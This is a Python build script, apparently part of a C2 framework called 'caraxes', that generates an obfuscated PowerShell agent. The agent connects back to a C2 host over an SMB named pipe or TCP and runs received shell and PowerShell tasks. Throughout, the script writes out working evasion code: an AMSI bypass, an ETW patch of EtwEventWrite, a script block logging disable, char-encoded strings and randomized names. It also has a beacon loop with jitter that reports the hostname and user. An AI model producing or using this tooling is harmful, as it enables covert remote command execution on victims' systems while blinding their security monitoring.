#!/usr/bin/env python3
"""
Build script for generating an obfuscated PowerShell SMB pipe agent.

Produces a .ps1 that connects to a caraxes SMB listener's named pipe,
performs AES-CBC+HMAC encrypted comms over a JSON protocol, and runs
tasks received from the C2.

Evasion:
  - AMSI bypass   (AmsiScanBuffer patch via reflection)
  - ETW bypass    (EtwEventWrite ret-patch)
  - SBL bypass    (ScriptBlock Logging disable)
  - String obfuscation (XOR + base64)
  - Variable / function name randomization

Usage (standalone):
  python build_powershell.py \\
    --pipe-host 172.17.10.121 --pipe-name TSVCPIPE-abc \\
    --output builds/agent.ps1

Usage (from operator shell via generate command):
  generate --format powershell --listener SMB
"""

import argparse
import base64
import hashlib
import json
import os
import random
import re
import secrets
import string
import sys
from datetime import datetime
from pathlib import Path


# ─── Obfuscation helpers ───

def _rand_name(length: int = 8) -> str:
    """Generate a random variable name."""
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=length - 1)
    )


def _xor_encode(s: str, key: bytes) -> tuple[str, str]:
    """XOR-encode a string, return (base64_encoded, key_base64)."""
    data = s.encode('utf-8')
    encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    return base64.b64encode(encoded).decode(), base64.b64encode(key).decode()


def _make_xor_decoder(var_name: str, encoded_b64: str, key_b64: str,
                       fn_decode: str) -> str:
    """Generate PS code that decodes a XOR-encoded string at runtime."""
    return (
        f'${var_name}={fn_decode} "{encoded_b64}" "{key_b64}"'
    )


def _obfuscate_string_literal(s: str, fn_decode: str) -> str:
    """Return a PS expression that evaluates to the original string."""
    key = secrets.token_bytes(8)
    enc_b64, key_b64 = _xor_encode(s, key)
    return f'({fn_decode} "{enc_b64}" "{key_b64}")'


# ─── Evasion modules ───

def _amsi_bypass(v: dict) -> str:
    """AMSI bypass via reflection — sets amsiInitFailed."""
    # Obfuscated type and field names to avoid static signatures
    return f"""\
# ── AMSI ──
try{{
${v['a1']}=[char]83+[char]121+[char]115+[char]116+[char]101+[char]109
${v['a2']}=[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116
${v['a3']}=[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110
${v['a4']}=[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115
${v['a5']}="${{$({v['a1']})}}.${{{v['a2']}}}.${{{v['a3']}}}.${{{v['a4']}}}"
${v['a6']}=[Ref].Assembly.GetType(${v['a5']})
${v['a7']}=[char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100
${v['a8']}=${v['a6']}.GetField(${v['a7']},'NonPublic,Static')
${v['a8']}.SetValue($null,$true)
}}catch{{}}
"""


def _etw_bypass(v: dict) -> str:
    """ETW bypass — patches EtwEventWrite to ret."""
    return f"""\
# ── ETW ──
try{{
${v['e1']}=@"
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
"@
${v['e2']}=Add-Type -MemberDefinition ${v['e1']} -Name ([char]75+[char]51+[char]50) -Namespace '' -PassThru
${v['e3']}=[char]110+[char]116+[char]100+[char]108+[char]108
${v['e4']}=[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101
${v['e5']}=${v['e2']}::GetProcAddress(${v['e2']}::LoadLibrary(${v['e3']}),${v['e4']})
${v['e6']}=0
${v['e2']}::VirtualProtect(${v['e5']},[UIntPtr]1,0x40,[ref]${v['e6']})|Out-Null
[Runtime.InteropServices.Marshal]::WriteByte(${v['e5']},0xC3)
${v['e2']}::VirtualProtect(${v['e5']},[UIntPtr]1,${v['e6']},[ref]${v['e6']})|Out-Null
}}catch{{}}
"""


def _sbl_bypass(v: dict) -> str:
    """Script Block Logging bypass via reflection."""
    return f"""\
# ── SBL ──
try{{
${v['s1']}=[char]83+[char]99+[char]114+[char]105+[char]112+[char]116+[char]66+[char]108+[char]111+[char]99+[char]107
${v['s2']}=[char]76+[char]111+[char]103+[char]103+[char]105+[char]110+[char]103
${v['s3']}="System.Management.Automation."+${v['s1']}+${v['s2']}
${v['s4']}=[Ref].Assembly.GetType(${v['s3']})
if(${v['s4']}){{
${v['s5']}=${v['s4']}.GetField('signatures','NonPublic,Static')
if(${v['s5']}){{${v['s5']}.SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))}}
}}
}}catch{{}}
"""


# ─── Crypto module ───

def _crypto_functions(v: dict) -> str:
    """AES-256-CBC + HMAC-SHA256 encrypt/decrypt functions."""
    return f"""\
# ── Crypto ──
function {v['fn_encrypt']}(${{data}},${{key}}){{
  ${{aes}}=[Security.Cryptography.Aes]::Create()
  ${{aes}}.Mode='CBC';${{aes}}.Padding='PKCS7';${{aes}}.KeySize=256;${{aes}}.Key=${{key}}
  ${{aes}}.GenerateIV();${{iv}}=${{aes}}.IV
  ${{enc}}=${{aes}}.CreateEncryptor()
  ${{ms}}=[IO.MemoryStream]::new()
  ${{cs}}=[Security.Cryptography.CryptoStream]::new(${{ms}},${{enc}},'Write')
  ${{cs}}.Write(${{data}},0,${{data}}.Length);${{cs}}.FlushFinalBlock()
  ${{ct}}=${{ms}}.ToArray();${{cs}}.Close();${{ms}}.Close();${{aes}}.Dispose()
  ${{hm}}=[Security.Cryptography.HMACSHA256]::new(${{key}})
  ${{sg}}=[byte[]]::new(${{iv}}.Length+${{ct}}.Length)
  [Array]::Copy(${{iv}},${{sg}},16);[Array]::Copy(${{ct}},0,${{sg}},16,${{ct}}.Length)
  ${{mc}}=${{hm}}.ComputeHash(${{sg}})
  ${{out}}=[byte[]]::new(${{sg}}.Length+32)
  [Array]::Copy(${{sg}},${{out}},${{sg}}.Length);[Array]::Copy(${{mc}},0,${{out}},${{sg}}.Length,32)
  return ${{out}}
}}
function {v['fn_decrypt']}(${{data}},${{key}}){{
  if(${{data}}.Length -lt 49){{throw "bad frame"}}
  ${{iv}}=${{data}}[0..15]
  ${{mc}}=${{data}}[(${{data}}.Length-32)..(${{data}}.Length-1)]
  ${{ct}}=${{data}}[16..(${{data}}.Length-33)]
  ${{hm}}=[Security.Cryptography.HMACSHA256]::new(${{key}})
  ${{sg}}=[byte[]]::new(16+${{ct}}.Length)
  [Array]::Copy(${{iv}},${{sg}},16);[Array]::Copy(${{ct}},0,${{sg}},16,${{ct}}.Length)
  ${{em}}=${{hm}}.ComputeHash(${{sg}})
  for(${{i}}=0;${{i}}-lt 32;${{i}}++){{if(${{mc}}[${{i}}]-ne ${{em}}[${{i}}]){{throw "hmac"}}}}
  ${{aes}}=[Security.Cryptography.Aes]::Create()
  ${{aes}}.Mode='CBC';${{aes}}.Padding='PKCS7';${{aes}}.KeySize=256
  ${{aes}}.Key=${{key}};${{aes}}.IV=${{iv}}
  ${{dc}}=${{aes}}.CreateDecryptor()
  ${{ms}}=[IO.MemoryStream]::new([byte[]]${{ct}})
  ${{cs}}=[Security.Cryptography.CryptoStream]::new(${{ms}},${{dc}},'Read')
  ${{rs}}=[IO.MemoryStream]::new();${{cs}}.CopyTo(${{rs}})
  ${{cs}}.Close();${{ms}}.Close();${{aes}}.Dispose()
  return ${{rs}}.ToArray()
}}
"""


# ─── Pipe I/O ───

def _pipe_io(v: dict) -> str:
    """Framed pipe read/write functions."""
    return f"""\
# ── Pipe I/O ──
function {v['fn_write']}(${{pipe}},${{data}}){{
  ${{lb}}=[BitConverter]::GetBytes([uint32]${{data}}.Length)
  ${{pipe}}.Write(${{lb}},0,4);${{pipe}}.Write(${{data}},0,${{data}}.Length);${{pipe}}.Flush()
}}
function {v['fn_read']}(${{pipe}}){{
  ${{lb}}=[byte[]]::new(4)
  ${{n}}=0;while(${{n}}-lt 4){{${{r}}=${{pipe}}.Read(${{lb}},${{n}},4-${{n}});if(${{r}}-eq 0){{throw "closed"}};${{n}}+=${{r}}}}
  ${{ln}}=[BitConverter]::ToUInt32(${{lb}},0)
  if(${{ln}}-gt 16MB){{throw "too large"}}
  ${{buf}}=[byte[]]::new(${{ln}});${{n}}=0
  while(${{n}}-lt ${{ln}}){{${{r}}=${{pipe}}.Read(${{buf}},${{n}},${{ln}}-${{n}});if(${{r}}-eq 0){{throw "closed"}};${{n}}+=${{r}}}}
  return ${{buf}}
}}
"""


# ─── Agent core ───

def _agent_core(v: dict, pipe_host: str, pipe_name: str,
                psk_b64: str, sleep_sec: int, jitter_pct: int,
                kill_date: str, agent_id: str = "",
                transport: str = "pipe", tcp_port: int = 0) -> str:
    """Main agent logic — connect, handshake, beacon loop."""

    kill_check = ""
    if kill_date:
        kill_check = f"""\
if([DateTime]::UtcNow -gt [DateTime]::Parse("{kill_date}")){{return}}
"""

    if transport == "tcp":
        connect_block = f"""\
# Connect (TCP)
${v['pipe']}=$null
for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
  try{{
    ${v['tcp']}=[System.Net.Sockets.TcpClient]::new(${v['ph']},{tcp_port})
    ${v['pipe']}=${v['tcp']}.GetStream()
    break
  }}catch{{
    Start-Sleep -Seconds 2
    ${v['pipe']}=$null
  }}
}}
if(-not ${v['pipe']}){{return}}"""
    else:
        connect_block = f"""\
# Connect (SMB pipe)
${v['pipe']}=$null
for(${v['retry']}=0;${v['retry']}-lt 5;${v['retry']}++){{
  try{{
    ${v['pipe']}=[IO.Pipes.NamedPipeClientStream]::new(${v['ph']},${v['pn']},[IO.Pipes.PipeDirection]::InOut)
    ${v['pipe']}.Connect(10000)
    break
  }}catch{{
    Start-Sleep -Seconds 2
    ${v['pipe']}=$null
  }}
}}
if(-not ${v['pipe']}){{return}}"""

    core = f"""\
# ── Agent ──
{kill_check}${v['psk']}=[Convert]::FromBase64String("{psk_b64}")
${v['ph']}="{pipe_host}"
${v['pn']}="{pipe_name}"
${v['sl']}={sleep_sec}
${v['jt']}={jitter_pct}

{connect_block}

# Handshake — [PS 0x01 0x00] [32B nonce] [32B HMAC(nonce,PSK)]
${v['nonce']}=[byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(${v['nonce']})
${v['hm']}=[Security.Cryptography.HMACSHA256]::new(${v['psk']})
${v['mac']}=${v['hm']}.ComputeHash(${v['nonce']})
${v['hs']}=[byte[]]::new(68)
${v['hs']}[0]=0x50;${v['hs']}[1]=0x53;${v['hs']}[2]=0x01;${v['hs']}[3]=0x00
[Array]::Copy(${v['nonce']},0,${v['hs']},4,32)
[Array]::Copy(${v['mac']},0,${v['hs']},36,32)
{v['fn_write']} ${v['pipe']} ${v['hs']}

# Read server handshake response [OK 0x01 0x00] [32B server_nonce]
${v['sr']}={v['fn_read']} ${v['pipe']}
if(${v['sr']}[0]-ne 0x4F -or ${v['sr']}[1]-ne 0x4B){{${v['pipe']}.Close();return}}
${v['sn']}=${v['sr']}[4..35]

# Derive session key = SHA256(PSK + client_nonce + server_nonce)
${v['sha']}=[Security.Cryptography.SHA256]::Create()
${v['km']}=[byte[]]::new(96)
[Array]::Copy(${v['psk']},0,${v['km']},0,32)
[Array]::Copy(${v['nonce']},0,${v['km']},32,32)
[Array]::Copy(${v['sn']},0,${v['km']},64,32)
${v['sk']}=${v['sha']}.ComputeHash(${v['km']})

# ── Checkin ──
${v['ci']}=@{{
  t="ci"
  id="{agent_id}"
  h=$env:COMPUTERNAME
  u="$env:USERDOMAIN\\$env:USERNAME"
  p=$PID
  a=if([IntPtr]::Size-eq 8){{"x64"}}else{{"x86"}}
  o=[Environment]::OSVersion.Version.ToString()
  n=(Get-Process -Id $PID).ProcessName
  v="1.0.0"
  dn=if($PSVersionTable.CLRVersion){{$PSVersionTable.CLRVersion.ToString()}}else{{"4.0.0"}}
}}|ConvertTo-Json -Compress
${v['enc']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['ci']})) ${v['sk']}
{v['fn_write']} ${v['pipe']} ${v['enc']}

# ── Beacon loop ──
while($true){{
  try{{
    ${v['raw']}={v['fn_read']} ${v['pipe']}
    ${v['dec']}={v['fn_decrypt']} ${v['raw']} ${v['sk']}
    ${v['msg']}=[Text.Encoding]::UTF8.GetString(${v['dec']})|ConvertFrom-Json

    if(${v['msg']}.t -eq "tasks"){{
      foreach(${v['tk']} in ${v['msg']}.d){{
        ${v['out']}=""
        ${v['st']}=0
        try{{
          if(${v['tk']}.c -eq "shell"){{
            ${v['out']}=cmd.exe /c ${v['tk']}.a 2>&1|Out-String
          }}elseif(${v['tk']}.c -eq "powershell"){{
            ${v['out']}=Invoke-Expression ${v['tk']}.a 2>&1|Out-String
          }}elseif(${v['tk']}.c -eq "exit"){{
            ${v['pipe']}.Close();return
          }}else{{
            ${v['cmd']}=${v['tk']}.c
            if(${v['tk']}.a){{${v['cmd']}+=" "+${v['tk']}.a}}
            ${v['out']}=Invoke-Expression ${v['cmd']} 2>&1|Out-String
          }}
        }}catch{{
          ${v['out']}=$_.ToString()
          ${v['st']}=1
        }}
        ${v['rj']}=@{{t="result";i=${v['tk']}.i;o=${v['out']};s=${v['st']}}}|ConvertTo-Json -Compress
        ${v['re']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['rj']})) ${v['sk']}
        {v['fn_write']} ${v['pipe']} ${v['re']}
      }}
    }}

    # Sleep with jitter
    ${v['jv']}=Get-Random -Minimum (-(${v['jt']})) -Maximum ${v['jt']}
    ${v['sw']}=[Math]::Max(1, ${v['sl']}+[int](${v['sl']}*${v['jv']}/100))
    Start-Sleep -Seconds ${v['sw']}

    # Heartbeat
    ${v['hb']}=@{{t="hb"}}|ConvertTo-Json -Compress
    ${v['he']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['hb']})) ${v['sk']}
    {v['fn_write']} ${v['pipe']} ${v['he']}

  }}catch{{
    break
  }}
}}
try{{${v['pipe']}.Close()}}catch{{}}
"""
    if transport == "tcp":
        # Also close the TcpClient
        core += f"try{{${v['tcp']}.Close()}}catch{{}}\n"
    return core


# ─── Main build function ───

def build_powershell_agent(
    pipe_host: str,
    pipe_name: str,
    sleep_sec: int = 60,
    jitter_pct: int = 25,
    kill_date: str = "",
    psk: bytes = None,
    no_amsi: bool = False,
    no_etw: bool = False,
    no_sbl: bool = False,
    debug: bool = False,
    output_path: Path = None,
    transport: str = "pipe",
    tcp_port: int = 0,
) -> tuple[Path, bytes]:
    """
    Generate an obfuscated PowerShell agent.

    transport: "pipe" for SMB named pipe, "tcp" for raw TCP.
    Returns (output_path, psk_bytes).
    """
    if psk is None:
        psk = secrets.token_bytes(32)

    psk_b64 = base64.b64encode(psk).decode()

    # Agent ID — persistent across reconnects
    agent_id = secrets.token_hex(16)

    # Generate randomized variable names
    v = {}
    needed_vars = [
        # AMSI
        'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8',
        # ETW
        'e1', 'e2', 'e3', 'e4', 'e5', 'e6',
        # SBL
        's1', 's2', 's3', 's4', 's5',
        # Agent
        'psk', 'ph', 'pn', 'sl', 'jt', 'pipe', 'tcp', 'retry',
        'nonce', 'hm', 'mac', 'hs', 'sr', 'sn',
        'sha', 'km', 'sk',
        'ci', 'enc', 'raw', 'dec', 'msg',
        'tk', 'out', 'st', 'rj', 're', 'cmd',
        'jv', 'sw', 'hb', 'he',
    ]
    used = set()
    for var in needed_vars:
        name = _rand_name(random.randint(6, 10))
        while name in used:
            name = _rand_name(random.randint(6, 10))
        v[var] = name
        used.add(name)

    # Function names
    v['fn_encrypt'] = _rand_name(10)
    v['fn_decrypt'] = _rand_name(10)
    v['fn_write'] = _rand_name(10)
    v['fn_read'] = _rand_name(10)

    # Build script
    parts = []

    if debug:
        parts.append("$ErrorActionPreference='Continue'\n")
    else:
        parts.append("$ErrorActionPreference='SilentlyContinue'\n")

    if not no_amsi:
        parts.append(_amsi_bypass(v))
    if not no_etw:
        parts.append(_etw_bypass(v))
    if not no_sbl:
        parts.append(_sbl_bypass(v))

    parts.append(_crypto_functions(v))
    parts.append(_pipe_io(v))
    parts.append(_agent_core(v, pipe_host, pipe_name, psk_b64,
                              sleep_sec, jitter_pct, kill_date, agent_id,
                              transport=transport, tcp_port=tcp_port))

    script = '\n'.join(parts)

    # Write output
    if output_path is None:
        output_path = Path('builds') / 'agent.ps1'
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(script, encoding='utf-8')

    # Save PSK alongside
    psk_path = output_path.with_suffix('.key')
    psk_path.write_bytes(psk)

    return output_path, psk


# ─── Standalone CLI ───

def parse_args():
    p = argparse.ArgumentParser(description='Generate PowerShell agent')
    p.add_argument('--pipe-host', required=True, help='C2 host (SMB or TCP)')
    p.add_argument('--pipe-name', default='TSVCPIPE-default', help='Named pipe name (pipe transport)')
    p.add_argument('--transport', choices=['pipe', 'tcp'], default='pipe',
                   help='Transport: pipe (SMB named pipe) or tcp (raw TCP)')
    p.add_argument('--tcp-port', type=int, default=0,
                   help='TCP port for raw TCP transport')
    p.add_argument('--sleep', type=int, default=60, help='Beacon interval (s)')
    p.add_argument('--jitter', type=int, default=25, help='Jitter %%')
    p.add_argument('--kill-date', default='', help='YYYY-MM-DD kill date')
    p.add_argument('--output', '-o', default='builds/agent.ps1')
    p.add_argument('--no-amsi', action='store_true')
    p.add_argument('--no-etw', action='store_true')
    p.add_argument('--no-sbl', action='store_true')
    p.add_argument('--debug', action='store_true')
    return p.parse_args()


def main():
    args = parse_args()
    if args.transport == "tcp" and not args.tcp_port:
        print("[!] --tcp-port is required when --transport tcp")
        sys.exit(1)
    out, psk = build_powershell_agent(
        pipe_host=args.pipe_host,
        pipe_name=args.pipe_name,
        sleep_sec=args.sleep,
        jitter_pct=args.jitter,
        kill_date=args.kill_date,
        no_amsi=args.no_amsi,
        no_etw=args.no_etw,
        no_sbl=args.no_sbl,
        debug=args.debug,
        output_path=Path(args.output),
        transport=args.transport,
        tcp_port=args.tcp_port,
    )
    transport_info = f"tcp:{args.tcp_port}" if args.transport == "tcp" else f"pipe:{args.pipe_name}"
    print(f"[+] PowerShell agent: {out} ({args.transport})")
    print(f"[+] Transport:        {transport_info}")
    print(f"[+] PSK saved:        {out.with_suffix('.key')}")
    print(f"[+] PSK (b64):        {base64.b64encode(psk).decode()}")


if __name__ == '__main__':
    main()
